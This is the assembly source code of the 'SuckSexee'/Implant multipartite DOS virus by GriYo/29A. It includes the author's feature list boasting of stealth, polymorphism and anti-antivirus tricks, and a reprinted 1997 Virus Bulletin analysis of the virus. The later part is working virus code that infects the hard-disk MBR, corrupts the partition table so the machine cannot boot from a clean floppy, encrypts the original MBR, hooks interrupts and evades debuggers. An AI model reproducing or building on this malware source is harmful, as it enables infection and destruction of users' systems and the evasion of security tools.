   ;
   ;                                                ÜÛÛÛÛÛÜ ÜÛÛÛÛÛÜ ÜÛÛÛÛÛÜ
   ;   ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ
   ;   ³        SuckSexee Automated Intruder         ÜÜÜÛÛß ßÛÛÛÛÛÛ ÛÛÛÛÛÛÛ
   ;   ³    Viral Implant Bio-Coded by GriYo/29A    ÛÛÛÜÜÜÜ ÜÜÜÜÛÛÛ ÛÛÛ ÛÛÛ
   ;   ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ ÛÛÛÛÛÛÛ ÛÛÛÛÛÛß ÛÛÛ ÛÛÛ
   ;
   ;       Disclaimer:
   ;       ÄÄÄÄÄÄÄÄÄÄÄ
   ;       The author is not responsable of any problems caused due
   ;       to assembly of this file.
   ;
   ;       Virus description:
   ;       ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;       o Residency:
   ;
   ;         The virus only goes resident when booting from an infected
   ;         hard drive or floppy disk.
   ;         While infecting files the virus uses UMB memory if
   ;         available.
   ;
   ;       o Infection:
   ;
   ;         1) Hard drive master-boot-record
   ;
   ;            The virus infects the HD MBR using direct port access
   ;            bypassing some TSR watchdogs and BIOS virus-protection
   ;            features.
   ;
   ;         2) Floppy boot sector
   ;
   ;            SuckSexee formats an extra track on floppy and saves there
   ;            the original BS (for stealth) and its main body.
   ;
   ;         3) Files (.COM .EXE and .SYS)
   ;
   ;            The virus uses low level system file table.
   ;            Files are infected on close, get/set attribute, rename,
   ;            move or upon termination.
   ;
   ;       o Stealth:
   ;
   ;         This virus is full-stealth, so the system seems to be clean
   ;         while infected.
   ;
   ;         1) Sector level
   ;
   ;            Attempts to read the HD MBR or floppy boot sector will result
   ;            in a clean copy being returned.
   ;            Attempts to read the sectors were the virus resides will not
   ;            be permitted.
   ;
   ;         2) File level
   ;
   ;            Attempts to read an infected file will result in a clean
   ;            copy being returned, as the virus disinfects files on the
   ;            fly, including if a debugging tool is used to edit the file.
   ;
   ;         3) Others...
   ;
   ;            Directory, search and date/time stealth also supported
   ;            Whenever win.com is executed, the virus adds some
   ;            parameters to avoid problems with Windows 32bit disk access.
   ;
   ;       o Armoured:
   ;
   ;         Attempts to write to the HD MBR or the sectors on which the virus
   ;         resides will not be permitted, but no error were returned
   ;         SuckSexee uses extended DOS partition trick, so infected
   ;         computers will not be able to boot from floppy.
   ;
   ;       o Polymorphism:
   ;
   ;         SuckSexee is encrypted under two encryption layers utilising a
   ;         polymorphic engine to generate first decryptor algorithm.
   ;         Generated polymorphic decryptor contains several conditional and
   ;         unconditional jumps as well as calls to subroutines and
   ;         interrupts.
   ;         The virus is polymorphic in all its infections.
   ;         This means that SuckSexee is polymorphic on hard drive MBR,
   ;         floppy boot sectors, .COM files, .EXE files and
   ;         also .SYS files.
   ;         While infecting floppy boot sectors the virus reads the
   ;         decryptor at MBR infection and uses it for each floppy.
   ;         While infecting files the virus will use the same decryptor
   ;         for each infected file.
   ;         If the system is rebooted a new mutation will be used
   ;         to infect files.
   ;         SuckSexee uses a timer to avoid multiple mutations in a
   ;         short period of time.
   ;
   ;       o Retro:
   ;
   ;         Polymorphic engine uses slow mutation technics (see note above).
   ;         The virus avoids some self-check executables being infected.
   ;         SuckSexee waits over 10 min. before it starts infecting files.
   ;         The virus does not infect files that have V character or
   ;         digit(s) in their names.
   ;         Command line parameters force TbScan to use compatibility
   ;         mode (so files can be stealthed and infected while
   ;         scanning) and skip memory scanning.
   ;         The virus encrypts the original MBR for a difficult recovery.
   ;
   ;
   ;       Virus Bulletin speaks
   ;       ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;       Thanks to mgl for the typing :)
   ;
   ; - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - >8
   ;
   ; VIRUS BULLETIN MAY 1997
   ;
   ; Silicon Implants
   ;
   ; Igor Muttik
   ; Dr Solomon's Software Ltd
   ;
   ;
   ; In February this Year, I received some flies which had been
   ; downloaded from an Internet virus exchange site and
   ; forwarded to us for analysis.  'Ah, the usual rubbish...', I
   ; thought; for it is rare to get new (let alone interesting!)
   ; viruses from such sources - if a file is not already identified
   ; as containing a known virus, it is usually either a corrupted
   ; virus, or not a virus at all.  It looked as though this would
   ; again be the case, but then, amongst  these files, I came
   ; across a new virus - Implant.6128.
   ;
   ; Implant is unusual in many aspects - it has full stealth, and
   ; is both polymorphic and multi-partite.  Stranger still, it works
   ; reliably - I have never seen a virus so complex and yet so
   ; stable. After all, it is both well known and intuitively obvious
   ; that as software gets more complex, it has more bugs.
   ;
   ; In my opinion, this explains perfectly why primitive computer
   ; viruses (most boot sector and macro infectors) are the most
   ; common in the wild.  Sophisticated viruses have more bugs,
   ; and thus have a smaller chance of surviving unnoticed in the
   ; field. Implant is a rare exception to this general rule.
   ;
   ; Returning to the virus' specifics, it is extremely polymorphic.
   ; The complexity of its decryptor by far exceeds that of
   ; many other famous polymorphic viruses. It is also extremely
   ; multi-partite, infecting COM, EXE and SYS files as well as
   ; the hard disk MBR and floppy boot sectors.
   ;
   ; Finally, Implant makes it impossible to boot the computer
   ; from a clean DOS system diskette: it does this using the
   ; circular extended partition technique, first seen implemented
   ; in Rainbow [see VB, September- 1995, P. 12].
   ;
   ;
   ; Initial Infection
   ; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ; When an infected file is run, or the infected floppy is left in
   ; the A: drive at boot time, the virus takes control in the
   ; traditional manner. After it decrypts itself, it checks the
   ; processor type: if the computer is 8088- or 80286-based (i.e.
   ; is an XT or an AT).  Implant immediately infects another
   ; file. However, if the machine is an 80386 or above, the virus
   ; issues its 'Are you there?' call - Int 12h, CX=029Ah, SI=OBADH,
   ; DI=FACEh.
   ;
   ; If, on return from the call, the SI and DI registers are set to
   ; DEADH and BABEH respectively (I wonder how many other
   ; words can be squeezed into 16 bits?) the virus assumes it is
   ; already active and proceeds to infect a file. Otherwise (if it
   ; is not already resident), it creates an array of 1024 random
   ; bytes (which will later be used by the virus' polymorphic
   ; engine) and passes control to the hard disk infection routine.
   ; This routine copies the MBR to sector 3 on track 0, and then
   ; finds the active partition record in the partition table,
   ; checking whether it is a 16-bit FAT DOS system (that is, the
   ; type field is set to 4 or 6).
   ;
   ; If so, Implant removes the active flag, sets the partition type
   ; to 5 (Extended DOS partition) and makes the pointer to its
   ; first sector point to the MBR (creating a so-called 'circular
   ; extended partition').
   ;
   ; Then the virus analyses the code in the MBR: it follows the
   ; jump chain (if present), and puts its code at the destination
   ; of the final jump - the virus code is such that it needs to
   ; leave only 35 bytes in the MBR!  Implant next writes the
   ; MBR back to disk by direct manipulation of I/0 ports (this
   ; will make it compatible with IDE and MFM drives, but
   ; not SCSI).
   ;
   ; After the write attempt, the virus rereads the MBR and
   ; checks whether the checksum of what was read matches
   ; what was written.  If not, the virus gives up, and passes
   ; control to the host program.
   ;
   ; Then the virus writes its body into 12 sectors on track 0
   ; starting at sector 4, right after the saved MBR.  Implant does
   ; not forget to check whether there is sufficient space on
   ; track 0 - if there are fewer than 13 sectors before the start of
   ; an active partition, the virus will not infect the hard drive.
   ; nor modify anything on track 0.
   ;
   ; Implant does not recognize itself in the MBR.  It just checks
   ; whether a resident copy is already present using its 'Are you
   ; there?' call.  If it is not in memory, it loads the MBR and
   ; scans for an active partition.  An already-infected MBR will
   ; not have this, so the infection will fail at this point - there is
   ; no risk of multiple infection.
   ;
   ; There are two main branches in the virus code. If the virus is
   ; run from a file (COM, EXE or SYS), control transfers to the
   ; host and nothing is left resident in memory. If, however, the
   ; virus is run from a boot sector (either that of a floppy or the
   ; hard disk's MBR), it seizes 7KB of DOS memory (by the
   ; familiar technique of reducing the word at memory offset
   ; [0:413h]), copies itself to the newly-created hole in memory
   ; just beneath the top of conventional memory, and intercepts
   ; some system interrupts.
   ;
   ; The method by which the virus infects the hard drive means
   ; that an MS-DOS system floppy cannot be used to clean-boot
   ; an Implant-infected PC. The circular extended partition will
   ; make MS-DOS v5 onwards, Novell DOS 7, and DR-DOS 6
   ; hang.  Fortunately, it is still possible to use versions 3.30 or
   ; 4.0 of MS-DOS, or PC-DOS 5 and 6, which will boot
   ; without problem.  After booting, however, drive C will still,
   ; of course, be inaccessible: attempts to access this drive will
   ; result in the error 'Invalid drive specification'.
   ;
   ;
   ; Booting the Infected System
   ; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ; When booting, the virus hooks interrupts 12h (self-recogni-
   ; tion and stealth), 13h (disk I/0: for stealth and to infect
   ; floppies), and 1Ch (timer; to intercept DOS interrupts later
   ; on).  All three are used to intercept Int 21 h: the virus can do
   ; this in three ways:
   ;
   ; - thirty seconds after the computer is booted (checked
   ;   using Int 1Ch)
   ;
   ; - when an infected program is run: when such a proaram
   ;  issues the 'Are you there?' Int 12h call (see above) the
   ;  resident copy of a virus will immediately hook Int 21h
   ;
   ; - when a program attempts to write to disk using Int 13h
   ;
   ; The virus has specific knowledge of some versions of DOS.
   ; and tries to get the real DOS entry point by following the
   ; jumps and doing some checks.  If an attempt to get the real
   ; entry point fails, the virus simply uses the one taken from
   ; the Interrupt Vector Table.
   ;
   ; When the virus has hooked Int 21h, it monitors the following
   ; DOS functions: 2Ah (Get date; used in a payload), 4B00h
   ; (Exec), 3Eh (Close), 43h (Attribute), 56h (Rename/Move),
   ; 4Ch (Terminate), 3Dh (Open), 6Ch (Open/Create). 11h/12h
   ; (Findfirst/Findnext FCB), 4Eh/4Fh (Findfirst/Findnext), 3Fh
   ; (Read), 4B01h (Load), 40h (Write), 5700h (Get timestamp),
   ; 5701h (Set timestamp).  These functions are used to infect
   ; files and conceal infection (full stealth).
   ;
   ; During infection, the virus also intercepts Int 24h (Critical
   ; error handler) to suppress error messaaes.
   ;
   ;
   ; Infection of Files
   ; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ; The virus infects files as they are run or opened. However, if
   ; any infected files are copied to diskette, the files on the
   ; diskette will be clean (despite the fact that the diskette's
   ; boot sector is infected) - Implant is 'full stealth'.  Running
   ; the file from the floppy does not infect it either. How, then.
   ; are infected files passed between users?
   ;
   ; The first thing the virus checks when any program calls any
   ; monitored DOS function is the program's name, paying
   ; special attention to files named AR*.*, PK*.*. LH*.*, and
   ; BA*.* (archiving utilities, specifically,  ARJ, PKZIP,  LHA
   ; and BACKUP). This information is used to turn off stealth
   ; mode when any of these archivers is executed.  Thus, the
   ; virus ensures all executable files are packed into archives
   ; and backups are infected, whether on floppy or hard disk.
   ;
   ; Further, it will not infect files called TB*.*, SC*.*, F-*.*,
   ; GU*.*, nor those containing the letters V, MO, IO,  DO,  IB
   ; or the digits 0-9.  Thus the virus avoids a wide variety of
   ; anti-virus programs,  DOS system files, and goat files used
   ; by virus researchers (which usually have digits in the name).
   ;
   ; Implant infects only files with the extensions COM,  EXE
   ; and SYS.  COM and SYS files longer than 52801 bytes are
   ; not infected.  Files with time-stamps set to 62 seconds are
   ; assumed already infected - this is the virus' infection stamp.
   ;
   ; To check whether a file is an EXE file, the virus adds the
   ; first two bytes of the file (for an EXE file, 4D5A or 5A4D)
   ; together: if the sum is A7h (A7h=4Dh+5Ah), the file is
   ; assumed to have an EXE header.  Simple and elegant.
   ;
   ; When resident, Implant denies access to files named
   ; CHKLIS*.*. These patterns match CHKLIST.MS or
   ; CHKLIST.CPS, and prevent Microsoft's and Central
   ; Point's scanners from working properly.
   ;
   ; If WIN.COM is executed, the virus adds a parameter ID:F to
   ; the program's command-line. This argument turns off
   ; Windows' 32-bit disk access, which enables infection of
   ; floppies accessed from within Windows.  If TBSCAN is
   ; executed, the virus adds the command-line parameters 'co'
   ; and 'nm', which instruct the program to skip the memory
   ; cheek and not use direct disk access ('compatibility mode').
   ;
   ;
   ; Infection of Floppies
   ; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ; The floppy disk boot sector is infected in much the same
   ; manner as the MBR.  The virus follows the jump chain in the
   ; floppy boot sector and writes 35 bytes of its code there. The
   ; encrypted polymorphic virus body is placed on a floppy on
   ; an additional track (number 80) which it first formats. This
   ; track will have 13 sectors: the first will carry a copy of an
   ; original boot sector: the rest will be occupied by the
   ; encrypted virus body.  To infect floppy disks,  Implant uses
   ; Int 40h, which usually points to BIOS code.
   ;
   ; The virus infects only 1.2MB or 1.44MB floppies.  It checks
   ; the total amount of sectors on the media (the word at offset
   ; 13h in the boot sector) and proceeds with infection only if
   ; the number of sectors is B40h or 960h (2880 or 2400,
   ; respectively). For self-recognition, the virus cheeks the two
   ; letters at offset 21 h from the last jump in the chain (if any):
   ; all infected floppies contain the marker 'CR' at this point.
   ;
   ; There is a bug in floppy infection: if the boot sector starts
   ; with a JMP (opcode E9h, not usual EBh), the virus code is
   ; inserted 1 byte lower than necessary. Still, the virus is able
   ; to work as the first instruction of its code is CLI, which
   ; takes just 1 byte and is not absolutely necessary.
   ;
   ;
   ; Polymorphic Engine
   ; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ; Implant's polymorphic engine is very powerful.  Suffice it to
   ; say that it supports subroutines, conditional jumps with non-
   ; zero displacement, and memory writes.  This engine takes a
   ; good half of the virus' code.
   ;
   ; The engine makes extensive use of the table of random bytes,
   ; created during the initialization phase. The approach of
   ; using a table generated just once during the installation of
   ; the virus into memory classifies Implant as a slow polymor-
   ; phic.  This means that the variety of the polymorphic
   ; decryptors is artificially limited until the next reboot of the
   ; PC. It poses some problems for anti-virus researchers, as it
   ; becomes difficult to create enough files infected in enough
   ; different ways to test detection.
   ;
   ; Files are encrypted in two layers: the first is polymorphic:
   ; the second is simple XOR encryption with a slightly
   ; variable decrylptor.  Some attempts are made to prevent
   ; tracing the second decryptor, but no anti-emulation tricks
   ; are used.
   ;
   ;
   ; Stealth Properties
   ; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ; Implant stealths its modifications to the MBR and FBR.  The
   ; virus also does not allow writes to the sectors on track 0
   ; which are used by the MBR copy and the virus body
   ; (sectors 03h to 0Fh).
   ;
   ; If any of the programs ME*.*. CH*.*, SY*.*, SM*.* is run
   ; (these patterns appear to be intended to match MEM.
   ; CHKDSK.  SYSINFO and SMAP) the virus spoofs the value
   ; returned by Int 12h (free RAM) by adding 7K to the real
   ; figure. Hence, the amount of memory is reported as it was
   ; before infection.
   ;
   ; The stealthing of infected files is more sophisticated than
   ; that of the MBR and floppy boot sector.  Most modern
   ; stealth viruses do 'semi-stealth' (just the change in the file
   ; size is concealed). Implant, on the other hand, is full stealth,
   ; so when the virus is active. even integrity checking pro-
   ; grams will not report any file modifications.
   ;
   ; A common problem to all stealth viruses is how, to suppress
   ; error messagres from the CHKDSK utility.  When run on a
   ; system infected with a stealth virus.  CHKDSK reports
   ; allocation errors, because reported file sizes do not match
   ; their actual sizes (i.e. the reported size in bytes does not
   ; match the number of clusters in the file allocation table).
   ; Implant recognizes that CHKDSK.EXE (or a similar utility)
   ; is being run, and turns off its stealth routine whilst the disk
   ; check is performed.
   ;
   ; If there is any doubt as to whether or not a PC is infected by
   ; Implant, the easiest way to check is to create a file called
   ; CHKLIST.  If there are problems accessing this file, the virus
   ; is almost certainly resident.  To check if a particular execut-
   ; able is infected, it is probably easiest to pack the file into an
   ; archive and check whether the size inside is the same as
   ; outside. If not, the file is infected.
   ;
   ;
   ; Payload
   ; ÄÄÄÄÄÄÄ
   ; Implant's payload triggers on 4 June. after any program asks
   ; for the system date.  The payload is buggy: it was apparently
   ; supposed to destroy the contents of track 0, rendering the
   ; system unusable, but the virus itself rejects the attempt to
   ; overwrite the infected MBR ! So, the destructive part of the
   ; payload does not work.
   ;
   ; After this unsuccessful attempt to zap itself, the virus slowly,
   ; types the following text in the middle of the screen (green
   ; letters on a black background, accompanied by a rattling,
   ; perhaps meant to resemble the noise of a typewriters):
   ;
   ;
   ;      <<< SuckSexee Automated Intruder >>>
   ;      Viral Implant Bio-Coded by GriYo/29A
   ;
   ;
   ; Then the PC freezes.  After a reboot (until you chance the
   ; CMOS clock setting) the payload will eventually trigger
   ; agrain because some program, sooner or later, will try to get
   ; the system date - and the cycle will begin again...
   ;
   ;
   ; Summary
   ; ÄÄÄÄÄÄÄ
   ; Implant impressed me.  It is definitely written by a talented
   ; person - it is a pity, his skills are used so destructively. I
   ; recently received another interesting virus (Gollum.7167)
   ; from the same author (carrying the signature 'GriYo/29A'):
   ; it spreads via infected standard DOS EXE files which drop a
   ; VxD in Windows'SYSTEM directory (called GOLLUM.386)
   ; and registers it in SYSTEM.INI. When Windows is started,
   ; the VxD becomes active and will infect DOS EXE files run
   ; in the DOS box.  This virus again shows that GriYo uses
   ; approaches that are neither common nor trivial.
   ;
   ; I wonder if this is talent comparable to the Dark Avenger or
   ; the author of One Half?  I sincerely hope such a gifted
   ; person will find better thing to do than write viruses.
   ; - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - >8
   ;
   ;       And finally...
   ;       ÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;       Greetings go to the following generation:
   ;
   ;       AúGuS & Company ............ SuckSexee people rulez
   ;       Absolute Overlord .......... PolyMorphic OpCode GENerator
   ;       Mister Sandman ............. Mississippi ruleeez, hahaha!
   ;       All the 29Aers ............. 29A 3LiT3 ;)
   ;
   ;       And all the replicants usually at #virus

   ;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;³Let's have some fun!                                                      ³
   ;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

                   .286
   launcher        segment para 'CODE'
                   assume cs:launcher,ds:launcher,es:launcher,ss:launcher
                   org 0000h

   ;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;³Equates, equates, equates...                                              ³
   ;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

                   ;Virus size in infections
   inf_byte_size   equ virus_data_buffer-virus_entry

                   ;Virus infection size in parragraphs
   inf_para_size   equ (inf_byte_size+0Fh)/0010h

                   ;Virus infection size in sectors
   inf_sect_size   equ (inf_byte_size+01FFh)/0200h

                   ;Virus size in memory
   mem_byte_size   equ virus_end_buffer-virus_entry

                   ;Virus size in memory in Kb
   mem_kb_size     equ (mem_byte_size+03FFh)/0400h

                   ;Virus size in memory in parragraphs
   mem_para_size   equ (mem_byte_size+0Fh)/0010h

                   ;Decryptor size in bytes
   decryptor       equ virus_body-virus_entry

                   ;Second decryptor size in bytes
   second_size     equ second_body-virus_entry

                   ;Boot code size in bytes
   boot_size       equ boot_end-boot_code

                   ;File header size
   file_header_size equ 1Ch

   ;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;³Virus entry-point for all its targets                                     ³
   ;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

   virus_entry:
                   ;Space for decryptor or random data block
                   db 0400h dup (90h)
   virus_body:
                   ;Get delta offset stored on infection ( mov bp,xxxx )
                   db 0BDh
   file_delta      dw 0000h

                   ;Save segment registers
                   push ds
                   push es

                   ;Save bx ( pointer to parameter block when calling .sys )
                   push bx

                   ;Setup segment regs
                   mov ax,cs
                   mov ds,ax
                   mov es,ax

   avoid_decryptor:
                   ;Avoid second decryptor on first virus generation
                   jmp short second_body

                   ;Perform second decryption loop
                   mov cx,inf_byte_size-second_size+01h

                   ;Get pointer to decryption zone and return address
                   lea ax,word ptr [second_body][bp]

                   ;Save return address
                   push ax

                   ;Load pointers
                   mov si,ax
                   mov di,ax

                   ;Get decryption key
                   mov bl,byte ptr cs:[clave_crypt][bp]
   second_loop:
                   ;Decrypt one byte
                   cld
                   lodsb
                   sub al,bl

                   ;Do shit with stack (will fool some emulators)
                   push ax
                   pop dx
                   cli
                   mov ax,0002h
                   sub sp,ax
                   sti
                   pop ax
                   cmp ax,dx
                   jne second_loop

                   ;Store decrypted byte
                   cld
                   stosb

                   ;Call to int 03h for anti debug
                   int 03h

                   ;Modify key
                   inc bl

                   loop second_loop

                   ;Clear prefetch
                   db 0EBh,00h
                   ;Jump to decryption zone
                   ret

   ;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;³Start of double-encrypted area                                            ³
   ;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

   second_body:
                   ;Check cpu type (SuckSexee needs 286+)
                   mov al,02h
                   mov cl,21h
                   shr al,cl
                   or al,al
                   jz control_back

                   ;Installation check
                   mov si,00BADh
                   mov di,0FACEh
                   xor cx,cx

                   ;Check if running in mbr, floppy boot sector or .sys file
                   cmp word ptr ds:[exit_address][bp],offset exit_exe - \
                                                      offset host_ret
                   je exe_com_installation
                   cmp word ptr ds:[exit_address][bp],offset exit_com - \
                                                      offset host_ret
                   jne others_installation

   exe_com_installation:

                   ;This will advertise to the already resident virus that
                   ;its time to hook int 21h if isnt hooked
                   mov cx,029Ah

   others_installation:

                   ;Installation check works with int 12h coz can be called
                   ;from mbr or from files... and also coz id like number 12h
                   int 12h
                   cmp si,0DEADh
                   jne not_resident
                   cmp di,0BABEh
                   jne not_resident

   control_back:
                   ;Get control back to infected target
                   db 0EBh,00h
                   ;Load offset of exit address into bx
                   db 0E9h
   exit_address    dw offset exit_launcher - offset host_ret

   host_ret        equ this byte

   ;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;³Infect hd mbr                                                             ³
   ;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

   not_resident:

                   ;Enable second decryption loop
                   mov word ptr [avoid_decryptor][bp],9090h

                   ;Generate a block of random data over decryptor routine
                   ;(that routine havent any use at this point so we can use
                   ;its memory space)
                   ;Polymorphic engine will use this data later for its
                   ;slow mutation procedures
                   ;This is better than other slow mutation engines i saw
                   ;coz it produces several mutations of the virus on the
                   ;same machine, but not enough mutations for
                   ;analisys

                   mov di,bp
                   mov cx,decryptor
   fill_rnd_1:
                   call random_number
                   cld
                   stosb
                   loop fill_rnd_1

                   ;Reset disk controler
                   xor ah,ah
                   mov dx,0080h
                   int 13h

                   ;Read mbr
                   mov ax,0201h
                   mov cx,0001h
                   lea bx,word ptr [virus_copy][bp]
                   int 13h
                   jnc ok_read_mbr
                   jmp go_memory

   ok_read_mbr:
                   ;Check for mbr marker
                   cmp word ptr ds:[bx+01FEh],0AA55h
                   jne no_mbr_infection

                   ;Search active partition
                   lea si,word ptr [virus_copy+01BEh][bp]
                   mov cl,04h
   search_active:
                   cmp byte ptr ds:[si],dl
                   je found_active
                   add si,10h
                   loop search_active

   no_mbr_infection:

                   ;Exit if no active partition found
                   ;This is also the way on witch the virus marks
                   ;infected mbr
                   jmp go_memory
   found_active:

                   ;Check partition type
                   mov al,byte ptr ds:[si+04h]

                   ;Dos 16bit-fat?
                   cmp al,04h
                   je partition_type_ok

                   ;Dos 4.0+ 32Mb?
                   cmp al,06h
                   je partition_type_ok

                   ;Exit if virus cant handle such partition type
                   jmp go_memory

   partition_type_ok:

                   ;Check if enougth sectors before partition
                   cmp byte ptr ds:[si+08h],inf_sect_size+01h
                   jb go_memory

                   ;Crypt original mbr
                   call crypt_sector

                   ;Write original mbr for stealth
                   mov ax,0301h
                   mov cl,03h
                   int 13h
                   jc go_memory

                   ;Restore sector
                   call crypt_sector

                   ;By using this trick the computer cant be booted
                   ;from a system floppy

                   ;Set partition type as extended dos partition
                   mov byte ptr ds:[si+04h],05h

                   ;Disable partition and set head to 00h
                   xor ax,ax
                   mov word ptr ds:[si],ax
                   inc ax

                   ;Set partition starting at cilinder 00h sector 01h
                   mov word ptr ds:[si+02h],ax

                   ;Save position of virus body in hd
                   ;(side 00h track 00h sector 04h)
                   inc cl
                   mov word ptr ds:[load_cx][bp],cx

                   ;Get position of code into mbr
                   call get_position

                   ;Move virus loader over boot sector code
                   lea si,word ptr [boot_code][bp]
                   mov cx,boot_size
                   cld
                   rep movsb

                   ;Write infected mbr
                   call hd_write_port

                   ;Save exit address
                   push word ptr ds:[exit_address][bp]

                   ;This will tell the virus that this is a mbr infection
                   mov word ptr ds:[exit_address][bp],offset exit_mbr - \
                                                      offset host_ret

                   ;Clear dos running switch
                   sub ax,ax
                   mov byte ptr ds:[running_sw][bp],al

                   ;Clear dos loaded flag
                   mov byte ptr ds:[dos_flag][bp],al

                   ;Clear file infection flag
                   mov byte ptr ds:[file_infection_flag][bp],al

                   ;Reset virus timer
                   mov word ptr ds:[virus_timer][bp],ax

                   ;Set delta offset for mbr poly engine
                   mov word ptr ds:[file_delta][bp],7E00h

                   ;Save pointer to polymorphic engine working buffer
                   mov word ptr ds:[poly_working_off][bp],bx
                   mov word ptr ds:[poly_working_seg][bp],es

                   ;Perform encryption
                   call do_encrypt

                   ;Write virus body
                   mov ax,0300h+inf_sect_size
                   mov cl,04h
                   int 13h

                   ;Restore exit address
                   pop word ptr ds:[exit_address][bp]

   ;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;³Go memory resident if running from mbr or floppy boot sector              ³
   ;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

   go_memory:
                   ;Running from hd mbr or floppy bs?
                   cmp word ptr cs:[exit_address][bp],offset exit_mbr - \
                                                      offset host_ret
                   jne running_in_file

                   ;Allocate some bios memory
                   sub di,di
                   mov es,di
                   sub word ptr es:[0413h],mem_kb_size
                   mov ax,word ptr es:[0413h]

                   ;Copy virus to allocated memory
                   mov cl,06h
                   shl ax,cl
                   mov es,ax
                   mov si,bp
                   mov cx,inf_byte_size
                   cld
                   rep movsb

                   ;Hook ints
                   push es
                   pop ds

                   ;Get int 12h vector
                   mov al,12h
                   call get_int

                   ;Save old int 12h
                   mov word ptr ds:[old12h_off],bx
                   mov word ptr ds:[old12h_seg],es

                   ;Hook int 12h
                   mov dx,offset my_int12h
                   call set_int

                   ;Get int 13h vector
                   inc al
                   call get_int

                   ;Save old int 13h
                   mov word ptr ds:[old13h_off],bx
                   mov word ptr ds:[old13h_seg],es

                   ;Hook int 13h
                   mov dx,offset my_int13h
                   call set_int

                   ;Get int 1Ch vector
                   mov al,1Ch
                   call get_int

                   ;Save old int 1Ch
                   mov word ptr ds:[old1Ch_off],bx
                   mov word ptr ds:[old1Ch_seg],es

                   ;Hook int 1Ch
                   mov dx,offset my_int1Ch
                   call set_int

                   ;Get int 40h vector
                   mov al,40h
                   call get_int

                   ;Save old int 40h
                   mov word ptr ds:[old40h_off],bx
                   mov word ptr ds:[old40h_seg],es

   running_in_file:
                   ;Return to boot sequence
                   jmp control_back

